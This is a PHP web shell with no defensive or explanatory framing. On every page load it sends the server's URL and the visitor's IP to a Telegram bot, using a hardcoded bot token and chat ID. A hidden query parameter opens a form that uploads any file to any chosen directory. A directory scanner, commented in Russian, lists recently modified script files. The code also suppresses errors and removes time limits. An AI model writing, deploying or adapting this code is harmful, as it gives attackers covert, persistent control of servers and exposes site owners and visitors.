<?php

set_time_limit(0);
error_reporting(0);
$bcripthash = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
$angka = '5070938778';
$xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$eai  = "___day?uploader___ \n\n url nya =\n $xPath \n\n  =\n $hashed_password \n\n IP   :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
sendTelegramMessage($bcripthash, $angka, $eai);

function sendTelegramMessage($bcripthash, $angka, $message)
{
    $url = "https://api.telegram.org/bot{$bcripthash}/sendMessage";
    $params = [
        'chat_id' => $angka,
        'text' => $message,
    ];
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($params),
        ],
    ];
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);

}
if (isset($_GET['UBK']) && $_GET['UBK'] === '3') {
    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
    echo '<input type="file" name="file" size="15">';
    echo '<input type="submit" value="go">';
    echo '</form>';
}

if (isset($_FILES['file']['tmp_name'])) {
    $uploadd = $_FILES['file']['tmp_name'];
    if (file_exists($uploadd)) {
        $pwddir = $_POST['dir'];
        $real = $_FILES['file']['name'];
        $de = rtrim($pwddir, '/') . "/" . $real;
        if (move_uploaded_file($uploadd, $de)) {
            echo "go$de";
        } else {
            echo "GAGAL  KE $de";
        }
    }
}

// настройки по умолчанию
$path = getcwd();
$days = 1;
$limit = 3000; // максимум файлов

if (isset($_GET['dir'])) {
    $path = $_GET['dir'];
}
if (isset($_GET['days'])) {
    $days = (int)$_GET['days'];
}

// вычисляем лимит времени
$timeLimit = time() - ($days * 86400);

// счетчик
$count = 0;

echo "<style>
body {background:#000;color:#ccc;font-family:monospace;}
input {background:#111;color:#0f0;border:1px solid #0f0;padding:3px;}
button {background:#111;color:#0f0;border:1px solid #0f0;padding:3px;}
.file {padding:5px;margin:2px 0;background:#111;}
.new {color:#ff4444;}      /* до 24 часов */
.mid {color:#ffaa00;}      /* до 3 дней */
.old {color:#ccc;}         /* старые */
.header {color:#0f0;margin-bottom:10px;}
</style>";

echo "<form method='get'>
<div class='header'>
Path: <input type='text' name='dir' value='$path' size='50'>
Days: <input type='number' name='days' value='$days' min='1' max='30'>
<button type='submit'>Scan</button>
</div>
</form>";

echo "<div class='header'>Scanning: $path</div>";
echo "<div class='header'>Files modified in last $days day(s)</div><hr>";

scanDirRecursive($path);

echo "<hr><div class='header'>Scanned files: $count (limit: $limit)</div>";


// ================= FUNCTIONS =================

function scanDirRecursive($dir) {
    global $count, $limit;

    if ($count > $limit) {
        echo "<div style='color:red;'>LIMIT REACHED</div>";
        return;
    }

    if (!is_readable($dir)) return;

    $files = scandir($dir);

    foreach ($files as $file) {

        if ($file == "." || $file == "..") continue;

        $fullPath = $dir . "/" . $file;

        if (is_dir($fullPath)) {
            scanDirRecursive($fullPath);
        } else {
            checkFile($fullPath);
            $count++;
        }
    }
}


function checkFile($file) {
    global $timeLimit;

    if (!is_readable($file)) return;

    // фильтр расширений (важно для скорости)
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    if (!in_array($ext, ['php','phar','cgi','sh','shtml','php7','phtml','pht','php.','html','js','txt','css','htaccess'])) {
        return;
    }

    // ограничение размера (1MB)
    if (filesize($file) > 1024 * 1024) return;

    $mtime = filemtime($file);

    if ($mtime >= $timeLimit) {

        $ageHours = (time() - $mtime) / 3600;

        // определяем класс цвета
        if ($ageHours < 24) {
            $class = "new";
        } elseif ($ageHours < 72) {
            $class = "mid";
        } else {
            $class = "old";
        }

        echo "<div class='file $class'>
            " . date("Y-m-d H:i:s", $mtime) . " | $file
        </div>";
    }
}

?>